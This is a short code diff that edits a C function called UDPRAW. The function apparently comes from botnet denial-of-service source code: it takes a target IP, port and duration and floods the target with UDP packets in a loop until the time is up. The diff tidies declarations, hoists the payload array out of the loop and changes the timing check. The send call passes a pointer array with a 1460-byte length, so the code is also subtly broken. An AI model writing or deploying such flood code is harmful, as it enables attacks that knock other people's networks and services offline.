@@ -2,10 +2,12 @@
 
 void UDPRAW(unsigned char *ip, int port, int secs)
 {
-	int string = socket(AF_INET, SOCK_DGRAM, 0);
-	time_t start = time(NULL);
-	struct sockaddr_in sin;
-	struct hostent *hp;
+	int		string = socket(AF_INET, SOCK_DGRAM, 0);
+	time_t	start = time(NULL) + secs;
+	struct	sockaddr_in sin;
+	struct	hostent *hp;
+	char	*stringme[] = {"\x8f"};
+
 	hp = gethostbyname(ip);
 	bzero((char *)&sin, sizeof(sin));
 	bcopy(hp->h_addr, (char *)&sin.sin_addr, hp->h_length);
@@ -14,12 +16,11 @@ void UDPRAW(unsigned char *ip, int port, int secs)
 	unsigned int a = 0;
 	while (1)
 	{
-		char *stringme[] = {"\x8f"};
 		if (a >= 50)
 		{
 			send(string, stringme, 1460, 0);
 			connect(string, (struct sockaddr *)&sin, sizeof(sin));
-			if (time(NULL) >= start + secs)
+			if (time(NULL) >= start)
 			{
 				close(string);
 				return ;
